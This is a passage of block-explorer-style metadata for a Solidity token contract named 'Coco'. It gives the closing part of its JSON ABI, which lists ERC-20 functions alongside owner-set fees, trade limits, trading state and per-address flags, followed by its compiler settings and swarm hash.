inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isGirl\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refreshFeeAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueLossToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"name\":\"rescueLossTokenAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reuseLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExclude\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExcludes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquidityBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnBuy\",\"type\":\"uint256\"}],\"name\":\"setFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquiditySell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnSell\",\"type\":\"uint256\"}],\"name\":\"setFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"setFeeTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setGirl\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"user\",\"type\":\"address[]\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setGirls\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"LimitBuy_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitSell_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitHold_\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_kn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_kb\",\"type\":\"uint256\"}],\"name\":\"setSurprise\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"s\",\"type\":\"uint256\"}],\"name\":\"setTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"surpAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSplit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Coco", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://18c3ad18925454240f73bb553c19bbae741483432a4e53b67c4dbf50fbd28da8"}